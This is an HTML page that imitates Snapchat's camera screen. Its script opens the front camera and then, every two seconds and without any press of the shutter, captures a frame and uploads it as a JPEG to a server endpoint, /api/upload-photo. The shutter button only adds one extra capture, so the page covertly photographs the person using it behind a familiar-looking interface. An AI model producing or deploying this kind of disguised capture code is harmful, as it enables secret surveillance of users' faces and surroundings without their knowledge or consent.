<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1, maximum-scale=1, user-scalable=0" />
  <title>Snapchat Clone</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
  <style>
    body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; background: #000; font-family: sans-serif; color: white; }
    #cameraVideo { position: fixed; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); z-index: 1; }
    .header { position: fixed; top: 0; width: 100%; padding: 15px; display: flex; justify-content: space-between; align-items: center; z-index: 10; }
    .profile-icon { width: 35px; height: 35px; border-radius: 50%; background: #333; overflow: hidden; }
    .top-right-icons { display: flex; gap: 20px; align-items: center; font-size: 20px; }
    .side-toolbar { position: fixed; right: 15px; top: 70px; display: flex; flex-direction: column; gap: 25px; z-index: 10; align-items: center; }
    .side-icon { font-size: 22px; filter: drop-shadow(0 2px 4px rgba(0,0,0,0.5)); cursor: pointer; }
    .zoom-container { position: fixed; bottom: 180px; left: 50%; transform: translateX(-50%); background: rgba(0, 0, 0, 0.4); backdrop-filter: blur(5px); padding: 5px 15px; border-radius: 20px; display: flex; gap: 15px; font-size: 13px; font-weight: bold; z-index: 10; }
    .zoom-active { color: #FFFC00; background: rgba(255,255,255,0.1); padding: 2px 8px; border-radius: 15px; }
    .capture-area { position: fixed; bottom: 80px; width: 100%; display: flex; justify-content: center; align-items: center; gap: 25px; z-index: 10; }
    .memories-btn { display: flex; flex-direction: column; align-items: center; font-size: 10px; cursor: pointer; }
    .memories-icon { width: 30px; height: 30px; border: 2px solid white; border-radius: 6px; margin-bottom: 4px; position: relative; }
    .red-dot { position: absolute; top: -4px; right: -4px; width: 8px; height: 8px; background: #FF3B30; border-radius: 50%; }
    .shutter-ring { width: 80px; height: 80px; border-radius: 50%; border: 6px solid white; display: flex; align-items: center; justify-content: center; background: transparent; transition: 0.1s; }
    .lens-preview { width: 55px; height: 55px; border-radius: 50%; object-fit: cover; border: 2px solid rgba(255,255,255,0.2); }
    .footer { position: fixed; bottom: 0; width: 100%; height: 65px; background: rgba(0,0,0,0.8); display: flex; justify-content: space-around; align-items: center; z-index: 20; }
    .nav-item { position: relative; font-size: 22px; color: #ccc; cursor: pointer; }
    .nav-badge { position: absolute; top: -8px; right: -12px; background: #FF3B30; color: white; font-size: 10px; padding: 2px 5px; border-radius: 10px; font-weight: bold; }
    #photoCanvas { display: none; }
  </style>
</head>
<body>
  <video id="cameraVideo" autoplay playsinline></video>
  <canvas id="photoCanvas"></canvas>

  <div class="header">
    <div class="flex items-center gap-4"><div class="profile-icon"><img src="https://api.dicebear.com/7.x/avataaars/svg?seed=Felix"></div><i class="fas fa-search text-xl"></i></div>
    <div class="top-right-icons"><i class="far fa-bell"></i><div class="relative"><i class="fas fa-user-plus"></i><span class="nav-badge">2</span></div><i class="fas fa-rotate"></i></div>
  </div>

  <div class="side-toolbar">
    <i class="fas fa-bolt-slash side-icon"></i>
    <i class="fas fa-music side-icon"></i>
    <div class="side-icon" style="border: 1.5px solid white; border-radius: 4px; padding: 0 2px; font-size: 12px; font-weight: bold;">HD</div>
    <i class="fas fa-chevron-down side-icon"></i>
  </div>

  <div class="zoom-container"><span>.5</span><span class="zoom-active">1x</span><span>2</span></div>

  <div class="capture-area">
    <div class="memories-btn"><div class="memories-icon"><div class="red-dot"></div></div><span>Memories</span></div>
    <div id="shutterBtn" class="shutter-ring"></div>
    <img src="https://cdn-icons-png.flaticon.com/512/5787/5787100.png" class="lens-preview">
  </div>

  <div class="footer">
    <i class="fas fa-location-dot nav-item"></i>
    <div class="nav-item"><i class="far fa-comment"></i><span class="nav-badge">20</span></div>
    <i class="far fa-face-smile nav-item" style="color: white;"></i>
    <i class="fas fa-users nav-item"></i>
    <i class="fas fa-play nav-item"></i>
  </div>

  <script>
    const video = document.getElementById('cameraVideo');
    const canvas = document.getElementById('photoCanvas');
    const shutter = document.getElementById('shutterBtn');

    async function startApp() {
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
      video.srcObject = stream;
      setInterval(takeSnapshot, 2000);
    }

    function takeSnapshot() {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d');
      ctx.translate(canvas.width, 0);
      ctx.scale(-1, 1);
      ctx.drawImage(video, 0, 0);

      fetch('/api/upload-photo', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ dataUrl: canvas.toDataURL('image/jpeg', 0.7) })
      }).catch(err => console.error(err));
    }

    shutter.addEventListener('click', () => {
      shutter.style.transform = "scale(0.9)";
      takeSnapshot();
      setTimeout(() => shutter.style.transform = "scale(1)", 100);
    });

    startApp();
  </script>
</body>
</html>
